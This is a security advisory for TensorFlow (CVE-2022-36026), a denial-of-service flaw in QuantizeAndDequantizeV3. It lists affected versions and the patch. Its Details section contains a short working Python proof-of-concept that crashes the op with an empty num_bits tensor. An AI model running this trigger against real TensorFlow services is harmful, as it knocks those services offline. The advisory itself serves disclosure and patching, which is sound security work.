# [M] TensorFlow vulnerable to `CHECK` fail in `QuantizeAndDequantizeV3`

## Summary
Severity: Medium
Advisory: GHSA-9cr2-8pwr-fhfq
CVE: CVE-2022-36026
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-9cr2-8pwr-fhfq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizeAndDequantizeV3` is given a nonscalar `num_bits` input tensor, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

signed_input = True
range_given = False
narrow_range = False
axis = -1
input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
num_bits = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)
```

### Patches
We have patched the issue in GitHub commit [f3f9cb38ecfe5a8a703f2c4a8fead434ef291713](https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9cr2-8pwr-fhfq
- https://nvd.nist.gov/vuln/detail/CVE-2022-36026
- https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
